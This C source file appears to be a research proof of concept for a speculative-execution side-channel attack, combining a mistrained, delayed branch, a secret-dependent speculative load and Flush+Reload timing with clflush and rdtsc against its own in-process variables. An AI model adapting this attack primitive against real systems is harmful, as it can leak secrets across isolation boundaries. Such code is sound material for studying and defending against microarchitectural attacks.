#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/types.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <inttypes.h>
#include <errno.h>
#include <string.h>
#include <stdbool.h>

#include "dummy.h"

//In util.c
static inline void clflush(void *p)
{
  asm volatile ("clflush (%0)" :: "r"(p));
}

/**
 * This function is modified from:
 *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
 */
static inline uint64_t start_time(void)
{
	uint64_t t;
	asm volatile(
		"lfence\n\t"
		"rdtsc\n\t"
		"shl $32, %%rdx\n\t"
		"or %%rdx, %0\n\t"
		"lfence"
		: "=a"(t) /*output*/
		:
		: "rdx", "memory", "cc");
	return t;
}

/**
 * This function is modified from:
 *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
 */
static inline uint64_t stop_time(void)
{
	uint64_t t;
	asm volatile(
		"rdtscp\n\t"
		"shl $32, %%rdx\n\t"
		"or %%rdx, %0\n\t"
		"lfence"
		: "=a"(t) /*output*/
		:
		: "rcx", "rdx", "memory", "cc");
	return t;
}

volatile unsigned int brcond;
volatile unsigned int secret;
unsigned int brcheck = 20;
unsigned int __attribute__ ((aligned (512))) array[128];

void spec_load(void* addr, int loop, bool test) {
  uint32_t val;
  volatile unsigned int *b = &brcond;
  volatile unsigned int *s = &secret;
  unsigned int *c = &brcheck;
  unsigned int *arr = &array[0];
  for (int i = 0; i < loop; ++i) {
    asm(
    R"(
      # Pointer chase *b to delay branch resolution
      # if (*b < *c) {
      movl (%3), %%r11d
      clflush (%2)
      mfence
      lfence
      movl (%2), %%eax
      cmp %%eax, %%r11d
      jle done

      # A = arr[*s]
      mov $0, %%r15
      movl (%4), %%r15d
      shl $2, %%r15d
      add %5, %%r15
      mov (%%r15), %%edx

      # 70 times sum += A
      mov $0, %%ecx
      .REPT 70
        add %%edx, %%ecx
      .ENDR

      # Load Non Speculative value (F+R)
      movl $0, %%eax
      callq 0x630
      lfence
      done: movl %%ecx, %0
    )"
    : "=r"(val), "+r"(addr), "+r"(b), "+r"(c), "+r"(s), "+r"(arr)
    :
    : "%r11", "%r15", "%r13", "%eax", "%ebx", "%ecx", "%edx", "memory"
    );
  }
}

int main(int argc, char* argv[]) {

  dummy();
  void* addr = &dummy;
  //uint64_t off = ((uint64_t)dummy & 0xFFF);
  //printf("%x\n", off);

  //Initialize values
  int numbits = 20;
  uint64_t wait;

  for(int i=0; i<numbits; i++) {
    brcond = 10;
    secret = 1;
    spec_load(addr, 1000000, false);

    //Attacker - Flush
    clflush(addr);

    /*
    //Victim Run
    if (i%2 == 0) {
      dummy();
    }
    else {
      //dummy_new();
      clflush(addr);
    }*/

    brcond = 30;
    if (i%2 == 0) {
      secret = 40;
      clflush(&array[secret]);
    }
    else {
      secret = 1;
    }

    spec_load((void*)addr, 1, false);

    //Attacker - Reload and check time
    uint64_t cycles, end;
    asm volatile("rdtsc\n": "=a" (cycles) : : "rcx", "rdx", "memory");
    end = cycles + 0x80000;
    while (cycles < end) {
        asm volatile("rdtsc\n": "=a"(cycles)  : : "rcx", "rdx", "memory");
    }

    uint64_t access_time2 = start_time();
    dummy();
    uint64_t start = stop_time() - access_time2;
    printf("got time %lu: %d, wanted %d!\n", start, (start < 200), (i%2));
  }
}

